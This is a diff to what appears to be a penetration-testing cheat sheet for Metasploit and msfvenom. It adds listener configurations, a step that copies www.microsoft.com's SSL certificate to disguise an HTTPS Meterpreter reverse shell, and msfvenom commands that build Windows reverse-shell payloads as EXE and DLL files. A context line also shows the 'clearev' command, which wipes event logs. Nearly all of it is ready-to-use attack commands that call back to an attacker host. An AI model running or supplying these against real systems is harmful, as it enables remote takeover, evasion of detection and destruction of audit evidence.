@@ -329,6 +329,40 @@ run
 meterpreter > clearev
 ```
 
+### Multi Handler
+##### Multi Handler
+```bash
+use exploit/multi/handler
+set LHOST <Attack Host>
+set LPORT <Port #>
+set PAYLOAD <Payload specified in msfvenom>
+run -j
+```
+##### Multi Handler with PEM
+```bash
+use exploit/multi/handler
+set LHOST <Attack Host>
+set LPORT <Port #>
+set HandlerSSLCert <Path to PEM generated>
+set StagerVerifySSLCert true
+set PAYLOAD <Payload specified in msfvenom>
+run -j
+```
+
+### HTTPS Reverse Shell with Impersonate SSL
+```bash
+use auxiliary/gather/impersonate_ssl
+set RHOST www.microsoft.com
+run
+
+use payload/windows/x64/meterpreter/reverse_https
+set LHOST <Attack Host>
+set LPORT 443
+set HandlerSSLCert <Path to PEM generated>
+set StagerVerifySSLCert true
+generate -t exe -f <Path to payload file>
+```
+
 # msfvenom
 ### Framework Encoders [--encoder ]
 ```bash
@@ -545,8 +579,12 @@ $ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=<Port #> -f exe -e x86/shikata_ga_nai -o <Outpuf File>
 ```
-##### Windows Meterpreter HTTPS Reverse Shell as DLL
+##### Windows Meterpreter HTTPS Reverse Shell
 ```bash
+# As EXE
+msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f exe -o payload.exe
+
+# As DLL
 msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f dll -o payload.dll
 ```
 
